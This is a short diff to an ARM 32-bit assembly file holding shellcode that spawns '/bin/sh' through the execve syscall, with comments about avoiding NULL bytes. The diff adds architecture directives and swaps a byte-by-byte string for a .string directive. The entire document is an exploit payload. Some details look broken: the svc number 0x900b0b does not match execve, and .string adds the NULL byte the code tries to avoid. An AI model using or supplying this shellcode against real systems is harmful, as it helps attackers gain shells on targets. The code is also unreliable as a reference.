@@ -3,6 +3,9 @@
 ;
 ; Execve("/bin/sh", ["/bin/sh", NULL], NULL) using syscall 0xb
 
+.arch arm
+.bits 32
+
 sub r2, r2, r2              ; r2 = 0 (will be used for NULL bytes)
 add r3, pc, 0x1c            ; r3 = address of "/bin/sh" string
 str r3, [sp, 4]             ; argv[0] = "/bin/sh"
@@ -13,10 +16,4 @@ add r3, pc, 4               ; r3 = address of argv on stack
 add r1, sp, 4               ; r1 = argv pointer
 strb r2, [r3, 1]            ; another NULL byte
 svc 0x900b0b                ; syscall execve (syscall 0xb)
-.byte 0x2f
-.byte 0x62
-.byte 0x69
-.byte 0x6e
-.byte 0x2f
-.byte 0x73
-.byte 0x68
+.string "/bin/sh"
